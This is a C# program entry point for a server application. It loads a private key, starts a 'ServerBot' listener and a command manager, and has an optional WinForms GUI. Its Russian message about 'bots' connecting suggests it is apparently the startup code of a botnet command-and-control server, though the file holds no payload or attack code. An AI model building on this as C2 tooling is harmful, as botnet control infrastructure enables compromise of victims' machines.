using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Threading;

namespace Server
{
    static class Program
    {
        static public Config cfg;
#if !NOGUI
		static public FormMain formMain;
#endif
		static public byte[] privateKey;
		static public ServerBot server;
		static CmdManager client;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
			Environment.CurrentDirectory = Application.StartupPath;
			Console.WriteLine("Working path " + Environment.CurrentDirectory);
			LoadSQLLiteAssembly();
            cfg = new Config();
            cfg.Load();
			try
			{
				privateKey = System.IO.File.ReadAllBytes("private.key");
			}
			catch
			{
#if !NOGUI
				MessageBox.Show("Нет приватного ключа, боты не смогут коннектиться");
#else
				Console.WriteLine("No file private.key, bots is not connect");
#endif
			}
			Thread serverThread;
			Thread clientThread;
			server = new ServerBot(Program.cfg.port);
			client = new CmdManager(Program.cfg.portClient, server);
			serverThread = new Thread(server.Start);
			serverThread.Start();
			clientThread = new Thread(client.Start);
			clientThread.Start();
#if !NOGUI
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
                Application.Run(new FormMain());
            }
            catch(Exception e)
            {
                string err = e.ToString();
                System.IO.StreamWriter sw = new System.IO.StreamWriter(Application.StartupPath + "\\error.txt");
                sw.WriteLine(err);
                sw.Close();
                MessageBox.Show("Произошла ошибка '" + err + "'", "Ошибка сервера");
            }
#endif
			while (true)
			{
				string s = Console.ReadLine();
				if (s == "exit") break;
			}
			server.Stop();
			server.Close();
			client.Stop();

            cfg.Save();
        }

		public static void LoadSQLLiteAssembly()
		{
			Uri dir = new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase);
			System.IO.FileInfo fi = new System.IO.FileInfo(dir.AbsolutePath);
			string appropriateFile = System.IO.Path.Combine(fi.Directory.FullName, GetAppropriateSQLLiteAssembly());
			System.Reflection.Assembly.LoadFrom(appropriateFile);
		}

		private static string GetAppropriateSQLLiteAssembly()
		{
			string pa = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
			string arch = ((String.IsNullOrEmpty(pa) || String.Compare(pa, 0, "x86", 0, 3, true) == 0) ? "32" : "64");
//			return "System.Data.SQLite.x" + arch + ".DLL";
			return "System.Data.SQLite.DLL";
		}
	}
}
